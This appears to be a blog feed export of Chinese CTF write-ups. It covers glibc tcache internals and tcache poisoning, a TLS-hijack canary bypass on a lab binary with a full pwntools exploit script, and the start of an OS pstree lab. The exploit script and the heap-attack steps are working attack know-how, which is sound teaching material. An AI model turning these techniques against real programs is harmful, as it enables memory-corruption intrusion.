&amp;attack;</code></p><p>把unsortedbin拿出来,在8*18&#x3D;0x90处也就是tcachebin的next区写入我们attack的栈地址，<strong>tcache bin next地址指向的是chunk的data区，和fastbin指向chunk头不同</strong></p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327142253602.png" alt="image-20230327142253602"></p><p><code>malloc(0x80);</code><br><code>ptr = malloc(0x80);</code></p><p>ptr指向我们的attack地址，如果开了canary，这里的attack[15]数组大小至少为15(canary最后一字节为0),tcache_get里会<code>e-&gt;key = NULL;</code>会破坏掉canary</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tcache Attach </tag>
            
            <tag> Tcache Poisoning </tag>
            
            <tag> Tcache Dup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache</title>
      <link href="/2023/03/26/Tcache/"/>
      <url>/2023/03/26/Tcache/</url>
      
        <content type="html"><![CDATA[<h2 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h2><p><strong>Thread local caching</strong></p><p>Tcache 是 glibc <strong>2.26</strong> (ubuntu 17.10) 之后引入的，其目的是为了提升堆管理的性能,性能的提升总是伴随更多的安全问题</p><h2 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h2><h3 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>next指向下一个相同大小的free chunk的data区，而不是其他bin通常指向的chunk头 <strong>LIFO</strong></p><p><strong>2.29</strong> 版本以后的 tcache_entry 增加了key字段防止doublefree等攻击 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p><strong>glibc 2.32</strong>以后这里的next字段也会不同，会进行异或加密，后面再说，最新版本的可以值好像也进行了加密</p><h3 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>每个 thread 都会维护一个 <code>tcache_perthread_struct</code>,通常是在第一个堆块,用来管理tcache</p><p><code>counts</code> 记录了 <code>tcache_entry</code> 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk</p><p>最多TCACHE_MAX_BINS 64个tcache bin从0x20-0x410 按0x10递增</p><h2 id="Tcache-how-2-work"><a href="#Tcache-how-2-work" class="headerlink" title="Tcache how 2 work"></a>Tcache how 2 work</h2><ol><li>第一次malloc，分配一块内存给tcache_perthread_struct，管理tcache </li><li>free时，size&lt;0x410(64位带chunke head)时，tcache链表少于7个未满，先放入tcaceh，满后和之前一样fastbin或其他合适bin，inuse位不会置零，不会合并</li><li>malloc时在tcache范围内，tcache有就拿，tcache没有时，如果<code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；<strong>因此 chunk 在 其他bin 中的顺序和 拿到tcache 中的顺序会反过来</strong></li></ol><h2 id="RTFSC"><a href="#RTFSC" class="headerlink" title="RTFSC"></a>RTFSC</h2><h3 id="申请"><a href="#申请" class="headerlink" title="申请"></a>申请</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">// 从 tcache list 中获取内存</span></span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="comment">// tc_idx由 size 计算的 idx 在合法范围内</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 该条 tcache 链不为空</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 进入与无 tcache 时类似的流程</span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">              &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>tcache-&gt;entries[tc_idx]不为空时tcache_get(tc_idx)申请</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];<span class="comment">//把最新的tcacehchunk拿出来</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS); <span class="comment">//判断index合法性</span></span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>); <span class="comment">//判断tcache bin链是不是为空</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;<span class="comment">//把tcache bin链指向下一个chunk</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]); <span class="comment">// 获得一个 chunk，counts 减一</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>几乎没有保护</p><p><strong>glibc2.32</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"> <span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line"> &#123;</span><br><span class="line">   tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">     malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">   tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">   --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">   e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">   <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>取出时会进行xor解密，2.32的next会通过PROTECT_PTR异或加密，把存储next的地址右移12位后和next异或后把解密地址(也就是chunk真实地址)放到tcache struct中，这让我们之前fastbin attach类似的伪造chunk在这里难道增加</p><h2 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h2><p>_int_free()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">// 64</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// mp_.tcache_count=7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);  <span class="comment">//p要释放的chunk，tc_idx对应size的entries下标</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure><p>判断 <code>tc_idx</code> 合法，<code>tcache-&gt;counts[tc_idx]</code> 在 7 个以内时，就进入 <code>tcache_put()</code></p><p>tcache_put()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span> <span class="comment">//chunk要释放的chunk，tc_idx对应size的entries下标</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="comment">//得到chunk的tcache_entry结构体 </span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class="comment">//64</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];<span class="comment">//chunk的next指向对应size链的最新一个chunk</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;<span class="comment">//把当前chunk放入 tcache_perthread_struct管理结构</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);<span class="comment">//++当前size数量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依旧几乎没有保护</p><p><strong>glibc2.29</strong>有了key</p><p>_int_free函数里会多会检测 key 字段是否为 tcache，如果相等则检测 free 的指针值是否在对应的tcache_entry 链上，出现则视为程序在double free</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)        </span><br><span class="line">            malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>glibc2.32</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">  detect a double free.  */</span></span><br><span class="line">e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br></pre></td></tr></table></figure><p>多了PROTECT_PTR 对当前释放chunk的tcache_entry的next指针变为存储当前next地址和next要指向chunkdata地址异或的值</p><p>看个例子</p><p><img src="/2023/03/26/Tcache/image-20230326234600469.png" alt="image-20230326234600469"></p><p>pwndbg帮我们自动解析了</p><p><img src="/2023/03/26/Tcache/image-20230326234343508.png" alt="image-20230326234343508"></p><p>0x55500000c6d9是怎么来的呢？ 红色部分异或来的：0x555555559380 xor 0x555555559&#x3D;0x55500000C6D9</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tcache Attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TLS劫持过canary(TLS Hijack Bypass Canary)</title>
      <link href="/2023/03/26/TLS-Hijack/"/>
      <url>/2023/03/26/TLS-Hijack/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/173QtGe1It9EX2OiocC0ZBw">https://pan.baidu.com/s/173QtGe1It9EX2OiocC0ZBw</a><br>提取码：1pcz</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/pwn&gt; checksec checkin </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/checkin&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>大致扫了一些，多线程的一个程序</p><p>主线程把flag读取到bss段</p><p>pthread_create创建的一个子线程的start_routine函数有栈溢出问题，溢出很大</p><p>pthread_join()等待阻塞</p><p>泄露canary基本不可能了，本来想着SSP(Stack Smashing Protect)Leak能不能把他的argv[0](__libc_argv)覆盖为flag地址，再破坏canary输出flag，但是不在一个线程栈区不一样</p><h3 id="线程共享"><a href="#线程共享" class="headerlink" title="线程共享"></a>线程共享</h3><p>在一个进程中，主线程和通过pthread_create()创建出来的子线程共享以下内容：</p><ol><li>进程的代码段、数据段、堆段和共享库等被映射到进程虚拟地址空间中的所有内存区域。</li><li>进程打开的文件描述符、信号处理器等进程级别的资源。</li><li>进程环境变量以及命令行参数等。</li><li>全局变量和静态变量等存储在bss段和data段中的数据。</li><li>动态分配的堆内存（malloc、calloc等）。</li><li>在进程中使用pthread_key_create()创建的线程特定数据（Thread-specific data，TSD）。</li></ol><p><strong>在Linux中，进程和线程都是轻量级的执行单元，它们有以下区别和联系</strong></p><p>区别：</p><ol><li>资源占用：进程是系统分配资源的基本单位，每个进程拥有独立的地址空间、文件描述符、信号处理器等系统资源，而线程共享同一个进程的资源。</li><li>调度：进程之间的切换代价比线程之间的切换代价要高，因为进程切换时需要保存和恢复更多的状态信息，而线程只需要保存和恢复少量的状态信息。</li><li>安全：不同进程之间的内存空间是相互隔离的，因此进程之间的访问不会相互干扰，而线程之间的访问则需要进行同步控制，以避免竞态条件等问题。</li></ol><p>联系：</p><ol><li>资源共享：进程内的所有线程共享同一个地址空间，因此它们可以共享全局变量、静态变量、代码段和数据段等内存区域。</li><li>处理器调度：线程是处理器调度的基本单位，一个进程中的多个线程可以并发执行，以提高处理器的利用率。</li><li>通信机制：进程之间通信可以使用IPC机制，而线程之间可以使用线程同步和互斥机制等方式进行通信和协调。</li></ol><h2 id="Thread-Local-Storage"><a href="#Thread-Local-Storage" class="headerlink" title="Thread Local Storage"></a>Thread Local Storage</h2><p><a href="https://gcc.gnu.org/onlinedocs/gcc/Thread-Local.html">https://gcc.gnu.org/onlinedocs/gcc/Thread-Local.html</a></p><p>线程局部存储（TLS），是一种变量的存储方法，每一个线程都会有一个副本，这个变量在它所在的线程内是全局可访问的，但是不能被其他线程访问到，这样就保持了数据的线程独立性。而熟知的全局变量，是所有线程都可以访问的，这样就不可避免需要锁来控制，增加了控制成本和代码复杂度。</p><p>gcc里再定义前加__thread就可以实现TLS</p><p>创建线程的时候会创建一个TLS（Thread Local Storage），该TLS会存储canary的值，而TLS会保存在stack高地址的地方</p><p><strong>主线程中的TLS通常位于mmap映射出来的地址空间里，而位置也比较随机，覆盖的可能性不大；子线程通常也是mmap出来的，子线程中的TLS则位于线程栈的顶部</strong></p><p><strong>tcbhead_t结构体</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="type">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                             thread descriptor used by libpthread.  */</span></span><br><span class="line">        <span class="type">dtv_t</span> *dtv;</span><br><span class="line">        <span class="type">void</span> *self;        <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">        <span class="type">int</span> multiple_threads;</span><br><span class="line">        <span class="type">int</span> gscope_flag;</span><br><span class="line">        <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">        <span class="type">uintptr_t</span> stack_guard;   <span class="comment">/* canary，0x28偏移 */</span></span><br><span class="line">        <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">        ……</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><h3 id="gdb多线程调试"><a href="#gdb多线程调试" class="headerlink" title="gdb多线程调试"></a>gdb多线程调试</h3><p>set follow-fork-mode child</p><p>show follow-fork-mode </p><p>(1)查看可切换调试的线程：info threads</p><p>(2)切换调试的线程：thread 线程id</p><p>(3)只运行当前线程：set scheduler-locking on</p><p>(4)运行全部的线程：set scheduler-locking off</p><p>(5)指定某线程执行某gdb命令：thread apply 线程id gdb_cmd</p><p>(6)全部的线程执行某gdb命令：thread apply all gdb_cmd</p><p><strong>x&#x2F;x pthread_self()或fsbase</strong>可以查看线程fs基位置</p><p>断点断到子线程函数</p><p><img src="/2023/03/26/TLS-Hijack/image-20230326174219767.png" alt="image-20230326174219767"></p><p>distance计算偏移，覆盖canary和stack_guard为用一个值即可,rop puts输出flag即可</p><p><img src="/2023/03/26/TLS-Hijack/image-20230326174414780.png" alt="image-20230326174414780"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./checkin&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="comment"># db(&#x27;b *0x401338&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401340&#x27;)</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x401341 &#x27;)</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x666666</span>)+p64(<span class="number">0x555555</span>)+p64(rop.rdi.address)+p64(<span class="number">0x4040C0</span>)+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x7d8</span>-<span class="number">0x20</span>)+p64(<span class="number">0x666666</span>)</span><br><span class="line">payload=padding</span><br><span class="line">sla(<span class="string">b&#x27;eckin\n&#x27;</span>,payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Tls Hijack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJUOS:M1 pstree</title>
      <link href="/2023/03/25/NJUOS-M1-pstree/"/>
      <url>/2023/03/25/NJUOS-M1-pstree/</url>
      
        <content type="html"><![CDATA[<p><a href="http://jyywiki.cn/OS/2022/labs/M1">http://jyywiki.cn/OS/2022/labs/M1</a></p><p><strong>Keep it simple, stupid &amp;&amp; Everything is a file.</strong></p><p>可以用strace看一下pstree的系统调用，找下思路</p><h3 id="找到进程关系"><a href="#找到进程关系" class="headerlink" title="找到进程关系"></a>找到进程关系</h3><p>proc 文件系统 (procfs) 是类 Unix 操作系统中的一种特殊文件系统，它以分层文件结构呈现有关进程的信息和其他系统信息，为动态访问内核中保存的进程数据提供了一种更方便和标准化的方法。 </p><p>dirent.h头文件里有读取文件夹的func <a href="https://man7.org/linux/man-pages/man0/dirent.h.0p.html">https://man7.org/linux/man-pages/man0/dirent.h.0p.html</a></p><p>目录操作函数opendir、readdir和closedir</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line">DIR *<span class="title function_">opendir</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span>;</span><br><span class="line">打开一个与给定的目录名name相对应的目录流，并返回一个指向该目录流的指针。打开后，该目录流指向了目录中的第一个目录项。</span><br><span class="line"><span class="keyword">struct</span> dirent *<span class="title function_">readdir</span><span class="params">(DIR *dir)</span>;</span><br><span class="line">readdir函数返回一个指向dirent结构体的指针，该结构体代表了由dir指向的目录流中的下一个目录项；如果读到end-of-file或者出现了错误，那么返回<span class="literal">NULL</span>。</span><br><span class="line"><span class="type">int</span> <span class="title function_">closedir</span><span class="params">(DIR *dir)</span>;</span><br><span class="line">closedir函数关闭与指针dir相联系的目录流。成功时返回<span class="number">0</span>；失败是返回<span class="number">-1</span>，并设置相应的错误代码errno。</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> &#123;</span></span><br><span class="line">        <span class="type">ino_t</span>          d_ino;       <span class="comment">/* inode number */</span></span><br><span class="line">        <span class="type">off_t</span>          d_off;       <span class="comment">/* offset to the next dirent */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span> d_reclen;    <span class="comment">/* length of this record */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span>  d_type;      <span class="comment">/* type of file */</span></span><br><span class="line">        <span class="type">char</span>           d_name[<span class="number">256</span>]; <span class="comment">/* filename */</span></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>&#x2F;proc&#x2F;PID&#x2F;stat：在 Linux 操作系统中，&#x2F;proc&#x2F;PID&#x2F;stat 文件提供了有关指定进程 PID 的进程状态信息。该文件的格式是一个文本文件，其中包含了进程的多个状态信息，这些信息通常以空格分隔。</p><p>&#x2F;proc&#x2F;PID&#x2F;status是可读性更好的stat</p><p>&#x2F;proc&#x2F;PID&#x2F;task：该目录包含了与指定进程 PID 关联的所有线程的信息，每个线程都有一个相应的子目录。这些子目录的名称为每个线程的线程 ID，其下包含了与该线程相关的信息，包括线程状态、线程所属的进程 ID、线程运行的 CPU 时间、线程栈的大小和内存地址等。此目录可以用于监视和管理进程中的多个线程。</p><p>这里我们只需要遍历&#x2F;proc&#x2F;PID&#x2F;stat拿到ppid就行</p><p> &#x2F;proc&#x2F;PID&#x2F;stat 文件的一般格式和其中包含的常见进程属性</p><ul><li>pid：进程 ID</li><li>comm：进程的命令名称</li><li>state：进程状态</li><li>ppid：父进程 ID</li><li>pgrp：进程组 ID</li><li>session：会话 ID</li><li>tty_nr：所使用的终端设备号</li><li>tpgid：进程组 ID</li><li>flags：进程标志</li><li>minflt：未分配页面的数量（内存不足）</li><li>cminflt：未分配文件缓存页面的数量</li><li>majflt：分配了的页面的数量</li><li>cmajflt：分配了的文件缓存页面的数量</li><li>utime：进程在用户模式下花费的时间（以时钟滴答为单位）</li><li>stime：进程在内核模式下花费的时间（以时钟滴答为单位）</li><li>cutime：子进程在用户模式下花费的时间</li></ul><h3 id="建树打印"><a href="#建树打印" class="headerlink" title="建树打印"></a>建树打印</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">processtree</span> &#123;</span></span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">char</span> pidname[<span class="number">36</span>];</span><br><span class="line">&#125; Processtree;</span><br></pre></td></tr></table></figure><p>所有进程都是进程1的子进程，我们把1进程作为root，边递归边打印树就可以</p><h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><blockquote><p>#include &lt;assert.h&gt;</p><p>assert(exp)可以帮助我们快速定位错误，exp为假（即为0），那么它先向stderr打印一条出错信息，然后通过调用 abort 来终止程序运行。</p><p>调试结束后可以在#include &lt;assert.h&gt;上方#define NDEBUG来禁用assert调用</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipinfo</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> pidname[<span class="number">36</span>];</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">pid_t</span> ppid;</span><br><span class="line">&#125; Pipinfo;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">processtree</span> &#123;</span></span><br><span 